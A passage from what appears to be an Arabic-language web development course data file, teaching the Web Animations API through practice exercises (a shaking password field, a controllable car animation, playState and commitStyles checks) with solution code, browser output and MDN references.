            R`الـ keyframes: من مكانه لـ ٢٠٠px شمال (في صفحة RTL) ونص شفاف`,
            R`ثانية، وبتبطّأ في الآخر، وتفضل على آخر frame، واسمها [["slide"]]`,
            R`قفلة [[animate()]]`,
            R`[["running"]] و [["slide"]] و [[1000]]: الـ object فيه حالته والـ timing بتاعه`,
            R`بنوقّف الحركة: [[playState]] بقت [["paused"]] والصندوق واقف مكانه`,
            R`اقفز لنص المدة (scrubbing): الصندوق بيترسم في المكان ده على طول`,
            R`[[500]] و [["paused"]] و [[-136.929]] بسبب الـ [[ease-out]]`,
            R`بنخلي السرعة أربع أضعاف قبل ما نكمّل، فالنص الفاضل بياخد ١٢٥ms بس`,
            R`[[play()]] بتكمّل من الـ [[currentTime]] اللي وقفنا عنده، مش من الأول`,
            R`استنى لحد ما تخلص: Promise من غير [[setTimeout]]`,
            R`[["finished"]] و [[-200]] و [[0.5]]: [[fill: "forwards"]] ماسك آخر frame`,
          ],
          practice: [
            { lvl: 'تطبيق', t: R`**ابني:** فورم كلمة سر، لو غلط: الحقل يتهز (keyframes يمين وشمال في ٤٠٠ms) ويتحط عليه border أحمر ورسالة. لو داس مرتين ورا بعض الاهتزاز يبدأ من الأول مش يتراكب. ولو [[prefers-reduced-motion]]: الرسالة واللون بس من غير اهتزاز (من قسمي ١ و ٦ في الشرح).`, done: R`كلمة غلط = اهتزاز ورسالة، وضغطتين ورا بعض = animation واحدة بس على الحقل، و [[1234]] = «أهلًا!»، ومع reduced motion مفيش animation خالص.`, sol: R`~~~live 200 اهتزاز كلمة السر (جرّب أي كلمة غير 1234)
<style>
  body { font: 16px/1.6 system-ui, sans-serif; margin: 16px; }
  input, button { font: inherit; padding: 4px 8px; }
  .bad { border: 2px solid #b42318; }
</style>
<form id="login">
  <label>كلمة السر <input id="pass" type="password" autocomplete="off"></label>
  <button>ادخل</button>
  <p id="msg" role="alert"></p>
</form>
<script>
const form = document.querySelector("#login");
const pass = document.querySelector("#pass");
const calm = matchMedia("(prefers-reduced-motion: reduce)");
let shake = null;
form.addEventListener("submit", e => {
  e.preventDefault();
  if (pass.value === "1234") { document.querySelector("#msg").textContent = "أهلًا!"; pass.classList.remove("bad"); return; }
  document.querySelector("#msg").textContent = "كلمة السر غلط";
  pass.classList.add("bad");
  if (calm.matches) return;
  shake?.cancel();
  shake = pass.animate(
    [{ translate: "0" }, { translate: "-8px" }, { translate: "8px" }, { translate: "-6px" }, { translate: "6px" }, { translate: "0" }],
    { duration: 400, easing: "ease-in-out" }
  );
});
</script>
~~~

~~~text الناتج (Chrome 157، Playwright)
كلمة غلط:                 «كلمة السر غلط»، animations على الحقل: 1، class="bad"
ضغطة تانية على طول:        animations على الحقل: 1
reducedMotion = "reduce": animations على الحقل: 0
1234:                     «أهلًا!»
~~~

- **[[translate]] مش [[transform]]:** خاصية CSS لوحدها للإزاحة، فلو الحقل عليه [[transform]] تاني (scale مثلًا) مش هيتمسح وقت الاهتزاز.
- **[[shake?.cancel()]]:** من غيرها الضغطتين بيعملوا animationين على نفس الخاصية، والأحدث بيغطي، بس الاتنين فاضلين في [[getAnimations()]] لحد ما يخلصوا.
- **[[role="alert"]]:** قارئ الشاشة بيقول الرسالة. الاهتزاز لوحده مش بيوصل للي مش شايف.
- **[[if (calm.matches) return]]:** الرسالة واللون كفاية، والاهتزاز زينة.` },
            { lvl: 'تطبيق', t: R`**ابني:** عربية بتمشي على خط في ٣ ثواني ([[linear]]، [[fill: "both"]])، وتحتها زراير: شغّل، وقّف، اعكس، أسرع ×٢، للآخر، ألغي. وسطر بيكتب [[playState]] و [[currentTime]] و [[playbackRate]] (من قسم ٢ في الشرح).`, done: R`كل زرار بيغيّر السطر صح: [[pause]] = paused، و [[reverse]] = سرعة بالسالب، و [[finish]] = finished، و [[cancel]] = idle و [[currentTime]] = null، و «شغّل» بعد «ألغي» بتبدأ من جديد.`, sol: R`~~~live 230 عربية بتتحكم فيها
<style>
  body { font: 15px/1.6 system-ui, sans-serif; margin: 16px; }
  .track { position: relative; height: 56px; border-bottom: 2px dashed #ccc; margin-block: 12px; max-width: 300px; }
  #car { position: absolute; inset-inline-start: 0; top: 4px; font-size: 32px; line-height: 1; }
  button { font: inherit; margin: 2px; }
  output { font-family: monospace; }
</style>
<div class="track"><span id="car" aria-hidden="true">🚗</span></div>
<p id="controls">
  <button type="button" data-do="play">شغّل</button>
  <button type="button" data-do="pause">وقّف</button>
  <button type="button" data-do="reverse">اعكس</button>
  <button type="button" data-do="fast">أسرع ×2</button>
  <button type="button" data-do="finish">للآخر</button>
  <button type="button" data-do="cancel">ألغي</button>
</p>
<p>الحالة: <output id="state"></output></p>
<script>
const car = document.querySelector("#car");
const anim = car.animate(
  [{ transform: "translateX(0)" }, { transform: "translateX(-260px)" }],
  { duration: 3000, easing: "linear", fill: "both" }
);
anim.pause();
const state = document.querySelector("#state");
function show() {
  const t = anim.currentTime === null ? "null" : Math.round(anim.currentTime) + "ms";
  state.textContent = anim.playState + " | " + t + " | سرعة " + anim.playbackRate;
}
const actions = {
  play: () => anim.play(),
  pause: () => anim.pause(),
  reverse: () => anim.reverse(),
  fast: () => anim.updatePlaybackRate(anim.playbackRate * 2),
  finish: () => anim.finish(),
  cancel: () => anim.cancel(),
};
document.querySelector("#controls").addEventListener("click", e => {
  const b = e.target.closest("[data-do]");
  if (!b) return;
  actions[b.dataset.do]();
  show();
});
setInterval(show, 250);
show();
</script>
~~~

~~~text الناتج (Chrome 157، Playwright داس بالترتيب)
البداية: paused | 0ms | سرعة 1
شغّل:    running | 0ms | سرعة 1
وقّف:    paused | 17ms | سرعة 1
أسرع:    paused | 33ms | سرعة 2
اعكس:    running | 33ms | سرعة 2
للآخر:   finished | 0ms | سرعة -2
ألغي:    idle | null | سرعة -2
شغّل:    running | 3000ms | سرعة -2
~~~

- **[[anim.pause()]] على طول بعد [[animate]]:** الحركة بتبدأ لوحدها، فبنوقفها عشان اليوزر يبدأ.
- **«اعكس» بعد «أسرع»:** السرعة بقت [[-2]] (نفس السرعة والاتجاه بالعكس)، و «للآخر» وداها لصفر لأن الآخر في الاتجاه ده هو البداية.
- **«شغّل» بعد «ألغي» بدأت من ٣٠٠٠ms:** السرعة لسه بالسالب، فالبداية هي آخر الحركة.
- **[[updatePlaybackRate]]** بدل [[playbackRate =]] وهي شغالة: بتغيّر السرعة من غير ما العربية تقفز.
- **الأرقام الصغيرة (17 و 33):** الوقت اللي عدّى بين الضغطات في Playwright. على جهازك هتختلف.
- **[[setInterval(show, 250)]]** عشان السطر يتحدث وهي ماشية. الأحسن [[requestAnimationFrame]] لو هتعرض حاجة بتتحرك مع الـ animation.` },
            { lvl: 'سريع', t: R`**اقرا وتوقّع:** [[const x = box.animate({ opacity: [1, 0] }, 1000)]]. إيه [[x.playState]] على طول؟ وبعد [[x.pause()]]؟ وبعد [[x.finish()]]؟ وبعد [[x.cancel()]]؟ و [[x.finished]] بعد [[cancel]] بتعمل إيه؟ (من قسم ٢ في الشرح).`, done: R`[["running"]] ثم [["paused"]] ثم [["finished"]] ثم [["idle"]]، و [[finished]] اترفضت بـ [[AbortError]] بعد الـ [[cancel]].`, sol: R`~~~js states.js (module في صفحة فيها #box)
const box = document.querySelector("#box");
const x = box.animate({ opacity: [1, 0] }, 1000);
const states = [x.playState];
x.pause(); states.push(x.playState);
x.finish(); states.push(x.playState);
await x.finished;
const y = box.animate({ opacity: [1, 0] }, 1000);
y.finished.catch(e => console.log("finished اترفضت:", e.name));
y.cancel(); states.push(y.playState, String(y.currentTime));
console.log(states.join(" → "));
~~~

~~~text الناتج (Chrome 157)
running → paused → finished → idle → null
finished اترفضت: AbortError
~~~

- **[[finished]] بتاعة [[x]] اتحلّت** بعد [[finish()]]، فالـ [[await]] عدّى على طول.
- **بعد [[finished]] الـ Promise مبتتغيرش:** لو عايز تستنى تاني بعد [[play()]] من جديد، [[anim.finished]] بترجّع Promise جديدة.
- **[[cancel()]]** = [["idle"]] و [[currentTime]] = [[null]]، والتأثير اتشال كأن الـ animation محصلتش.` },
            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** [[box.animate({ transform: ["none", "scale(1.5)"] }, 300)]]. الصندوق بيكبر وبعدين **بيرجع** صغير. صلّحه بطريقتين: بـ [[fill]]، وبـ [[commitStyles()]] و [[cancel()]]، واطبع [[box.style.transform]] و [[box.getAnimations().length]] في الاتنين (من قسم ٣ في الشرح).`, done: R`الطريقة الأولى: [[style.transform]] فاضي و animation واحدة فاضلة. التانية: [[style.transform]] = [["scale(1.5)"]] و صفر animations.`, sol: R`~~~js keep-end.js (module في صفحة فيها #box)
const box = document.querySelector("#box");
const a = box.animate({ transform: ["none", "scale(1.5)"] }, { duration: 100, fill: "forwards" });
await a.finished;
console.log("fill:", JSON.stringify(box.style.transform), box.getAnimations().length, getComputedStyle(box).transform);
a.cancel();
const b = box.animate({ transform: ["none", "scale(1.5)"] }, { duration: 100, fill: "forwards" });
await b.finished;
b.commitStyles();
b.cancel();
console.log("commitStyles:", box.style.transform, box.getAnimations().length);
~~~

~~~text الناتج (Chrome 157)
fill: "" 1 matrix(1.5, 0, 0, 1.5, 0, 0)
commitStyles: scale(1.5) 0
~~~

- **من غير [[fill]]** الـ animation بتخلص وتتشال، والعنصر بيرجع لقيمة الـ CSS بتاعته ([[none]]).
- **[[fill: "forwards"]]:** شكله صح ([[matrix(1.5...)]] في الـ computed)، بس [[style.transform]] فاضي والـ animation لسه ماسكة الخاصية. لو كتبت [[box.style.transform = "none"]] بعدين مش هيحصل حاجة.
- **[[commitStyles()]]:** كتب القيمة الحالية في [[style]]، و [[cancel()]] شالت الـ animation. ده الأنضف لما الحالة الجديدة هي الحالة الدايمة.` },
            { lvl: 'تطبيق', t: R`**قارن:** صفحة فيها عنصر عليه CSS [[animation: spin 2s linear infinite]] وعنصر تاني عليه [[transition: opacity 1s]]. غيّر [[opacity]] التاني، واطبع [[document.getAnimations()]] بنوع كل واحدة واسمها، ووقّف الـ spin من JS، واستنى الـ transition تخلص بـ [[finished]] (من قسم ٤ في الشرح).`, done: R`اتطبع [[CSSTransition:opacity, CSSAnimation:spin]]، والـ spin بقى [["paused"]]، والـ [[await]] على الـ transition خلص من غير [[setTimeout]].`, sol: R`~~~html css-and-waapi.html
<style>
  .box { width: 60px; height: 60px; background: #0a7; border-radius: 8px; }
  .spin { animation: spin 2s linear infinite; }
  @keyframes spin { to { rotate: 1turn; } }
  .fade { transition: opacity 1s; }
</style>
<div class="box spin" id="b"></div>
<div class="box fade" id="c"></div>
<script type="module">
const c = document.querySelector("#c");
getComputedStyle(c).opacity;
c.style.opacity = 0;
console.log(document.getAnimations().map(a => a.constructor.name + ":" + (a.animationName || a.transitionProperty || a.id)).join(", "));
const spin = document.querySelector("#b").getAnimations()[0];
console.log(spin.playState);
spin.pause();
console.log(spin.playState);
await Promise.all(c.getAnimations().map(a => a.finished));
console.log("الـ transition خلصت، opacity =", getComputedStyle(c).opacity);
</script>
~~~

~~~text الناتج (Chrome 157)
CSSTransition:opacity, CSSAnimation:spin
running
paused
الـ transition خلصت، opacity = 0
~~~

- **[[animationName]]** على [[CSSAnimation]] و **[[transitionProperty]]** على [[CSSTransition]]: الاتنين نوع من [[Animation]] فعليهم [[pause]] و [[finished]] وكله.
- **[[getComputedStyle(c).opacity]] قبل التغيير مش زيادة:** أول تشغيل كان من غيره، والناتج كان [[CSSAnimation:spin]] بس، و [[await]] خلص على طول. السكربت شغال والعنصر لسه متحسبلوش style أصلًا، فالمتصفح مشافش «قيمة قديمة» يعمل منها transition: العنصر اترسم على طول بـ [[opacity: 0]]. قراية أي قيمة محسوبة بتجبر المتصفح يحسب الـ style الأول، فالتغيير بعدها بقى transition. (نفس الفخ لما تضيف عنصر وتحط عليه class في نفس السطر: درس «transition و @keyframes».)
- **الترتيب:** الـ transitions قبل الـ CSS animations في [[getAnimations()]]، وبعدهم اللي اتعملوا بـ [[animate()]].
- **[[Promise.all(...finished)]]** هي الطريقة الصح تستنى CSS transition. [[transitionend]] event كمان شغال، بس مبيجيش لو الـ transition اتلغت.` },
          ],
          ref: [
            { t: "MDN: Web Animations API", url: "https://developer.mozilla.org/en-US/docs/Web/API/Web_Animations_API" },
            { t: "MDN: Using the Web Animations API", url: "https://developer.mozilla.org/en-US/docs/Web/API/Web_Animations_API/Using_the_Web_Animations_API" },
            { t: "MDN: Element.animate()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Element/animate" },
            { t: "MDN: Animation", url: "https://developer.mozilla.org/en-US/docs/Web/API/Animation" },
            { t: "MDN: Animation.finished", url: "https://developer.mozilla.org/en-US/docs/Web/API/Animation/finished" },
            { t: "MDN: Animation.commitStyles()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Animation/commitStyles" },
            { t: "MDN: Document.getAnimations()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Document/getAnimations" },
            { t: "MDN: prefers-reduced-motion", url: "https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/At-rules/@media/prefers-reduced-motion" },
          ],
          pre: [{ to: "css/transition و @keyframes", why: R`نفس الـ keyframes والـ easing والـ fill بس في CSS` }, { to: "css/تكبير الخط و prefers-reduced-motion", why: R`النسخة الهادية من كل حركة في CSS` }, "js/async و await"],
          deep: {
            why: R`أي واجهة حديثة فيها حركة مش ثابتة: إشعارات بتدخل وتخرج، وعناصر بتتنقل، وزرار بيتهز. من غير WAAPI بتكتب [[setTimeout]] بنفس مدة الـ CSS، وبتضيف وتشيل classes، وبتحسب بإيدك. WAAPI بيديك object وPromise، ونفس أداء CSS.`,
            how: R`كل [[animate()]] بيعمل [[KeyframeEffect]] (الـ keyframes والـ timing والعنصر) و [[Animation]] (التشغيل) مربوطة بـ [[document.timeline]]. المتصفح في كل frame بيحسب القيمة من [[currentTime]] والـ easing ويحطها فوق الـ style (مش جواه). ولو الخصايص [[transform]] و [[opacity]] بس، الحساب بيحصل على الـ compositor thread، فالحركة بتفضل ناعمة حتى لو الـ main thread مشغول.`,
            when: R`WAAPI لحركة محسوبة، أو محتاجة تحكم، أو محتاج تستنى نهايتها، أو لعناصر اتعملت من JS. CSS لحالات ثابتة (hover، focus، class). مكتبة (Motion أو GSAP) لحركات معقدة متسلسلة كتير، أو spring physics، أو scroll-linked animations في متصفحات قديمة.`,
            mistakes: R`[[setTimeout]] بنفس المدة بدل [[finished]]. نسيان [[fill]] والعنصر يرجع. [[fill: "forwards"]] على كل حاجة والـ animations تتراكم. [[finished]] من غير [[catch]] مع [[cancel()]]. [[duration]] بالثواني ([[0.3]]). تحريك [[left]] و [[width]]. تجاهل [[prefers-reduced-motion]]. حركتين على نفس الخاصية من غير [[cancel]] للقديمة.`,
          },
        },
      ]
    }
]);
